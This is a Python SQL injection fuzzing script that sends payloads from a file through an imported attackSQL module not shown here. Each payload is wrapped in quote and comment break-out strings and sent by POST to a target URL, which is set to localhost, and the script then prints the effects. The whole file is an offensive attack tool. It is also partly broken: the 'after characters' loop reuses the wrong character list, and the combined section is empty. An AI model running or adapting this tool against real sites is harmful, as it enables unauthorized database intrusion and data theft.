#!/usr/bin/python3

import requests, urllib, attackSQL

#****************URL****************************
url = 'http://127.0.0.1'

#*****************PAYLOAD************************
payloads = open('list', 'r').read().split('\n')

#*****************HEADERS************************ 
Vheader = True
headers = {'Content-Type' : 'application/x-www-form-urlencoded'} # for post variables

#****************METHOD**************************
method = "POST"

#***************COOKIE**************************
Vcookie = False
cookies = {"name" : "value"}

#***************CHARACTERS_BEFORE***************
chartersBefore = ['\'', '"', '', '\' ', '" ']

#**************CHARACTERS_AFTER****************
chartersAfter = ['--', '-- -', '#', '', ' --', ' -- -', ' #'] 


#****************************ATTACKS************* (attack we want)
OnlyBeforeCharcters = True 
OnlyAfterCharcters = True 
AfterAndBeforeCharters = True


#*************************START_ATTACK*********** 
ATTACK = attackSQL.attackSQL()

print()
print()
print("-----ATTACK-----")

#****************************ONLY_BEFORE_CHARTERS**********************
if(OnlyBeforeCharcters == True):
    print("[+] Before Characters")
    for pay in payloads:
        for x in chartersBefore:
            payload = x + pay
            if((Vheader == True) and (Vcookie == True)):
                ATTACK.attackHeadersCookie(url, payload, method, headers, cookies)
            elif(Vheader == True):
                ATTACK.attackHeaders(url, payload, method, headers)
            elif(Vcookie == True):
                ATTACK.attackCookie(url, payload, method, cookies)
            else:
                ATTACK.attack(url, payload, method)

#****************************ONLY_AFTER_CHARTERS***********************
if(OnlyAfterCharcters == True):
    print("[+] After Characters")
    for pay in payloads:
        for x in chartersBefore:
            payload = pay + x
            if((Vheader == True) and (Vcookie == True)):
                ATTACK.attackHeadersCookie(url, payload, method, headers, cookies)
            elif(Vheader == True):
                ATTACK.attackHeaders(url, payload, method, headers)
            elif(Vcookie == True):
                ATTACK.attackCookie(url, payload, method, cookies)
            else:
                ATTACK.attack(url, payload, method)

#****************************AFTER_AND_BEFORE_CHARTERS****************



#***************************SHOW_RESULT********************************
print("----------------")
print()
print()
print("**************************RESULT*******************************")
print()
ATTACK.showEffect()
print("**************************************************************")
print()
